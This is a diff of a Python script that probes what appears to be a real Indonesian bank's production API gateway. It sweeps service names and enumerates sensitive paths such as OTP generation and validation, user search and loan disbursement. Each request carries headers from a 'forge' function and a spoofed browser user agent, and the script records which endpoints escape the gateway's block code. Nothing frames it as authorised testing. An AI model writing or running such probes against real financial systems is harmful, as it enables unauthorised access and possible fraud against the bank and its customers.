@@ -88,17 +88,14 @@ for op in ["process", "callback", "notify", "handleResponse", "onEvent", "update
 for svc in ["LoanService", "CicilanService", "WorkflowService", "CallbackService", "BinaService", "OnboardingService", "MasterDataService"]:
     s, b = req("GET", "https://apigw-prod.bankina.id/services/" + svc, {"User-Agent": "Mozilla/5.0"})
     print("SVC " + svc + " => " + str(s) + " " + b[:60])
-print("== V13: SWEEP NAMA exp-api ==")
-names = ["exp-api-auth","exp-api-user","exp-api-users","exp-api-onboarding","exp-api-loan","exp-api-master","exp-api-bina","exp-api-cicilan","exp-api-portal-loan","exp-api-portal","exp-api-savings","exp-api-deposit","exp-api-account","exp-api-transfer","exp-api-payment","exp-api-qris","exp-api-partner","exp-api-webview","exp-api-customer","exp-api-kyc","exp-api-eform","exp-api-digital","exp-api-bankina","exp-api-ina","exp-api-bni","exp-api-callback","exp-api-workflow","exp-api-mall","exp-api-financing","exp-api-syariah"]
+print("== V14: SEMUA PATH API BANK (cek mana yang tidak blocked) ==")
+paths = ["/master/config","/master/marital-status","/master/province","/master/religion","/master/privacy-and-policy","/master/terms-and-condition","/onboarding/otp/generate","/onboarding/otp/validate","/onboarding/user","/onboarding/user/search","/loan/booking","/loan/booking-status","/loan/disburse","/loan/initiate-booking","/loan/limit","/loan/loan-booking","/loan/loan-limits","/loan/loan-preview","/loan/loan-tenor","/loan/eligibility-check","/loan/bill-inquiry","/loan/partner/config","/installment/booking","/installment/limit","/cicilan/dashboard"]
 import time
-for n in names:
-    path = "/" + n + "/1.0/"
-    h = forge("GET", path)
-    s, b = req("GET", "https://apigw-prod.bankina.id" + path, {"User-Agent":"Mozilla/5.0", **h})
-    if "700700" in b:
-        print("BLOCKED " + n)
-    elif s == 404:
-        print("404      " + n)
-    else:
-        print(">>> " + str(s) + " " + n + " => " + b[:120])
-    time.sleep(0.3)
+for p in paths:
+    for base in ["/exp-api-portal-loan/1.0", "/exp-api-cicilan/1.0"]:
+        path = base + p
+        h = forge("GET", path)
+        s, b = req("GET", "https://apigw-prod.bankina.id" + path, {"User-Agent":"Mozilla/5.0", **h})
+        tag = "BLOCKED" if "700700" in b else ("404" if s == 404 else ">>> " + str(s))
+        print(tag + " " + path + " => " + b[:100].replace("\n"," "))
+        time.sleep(0.25)
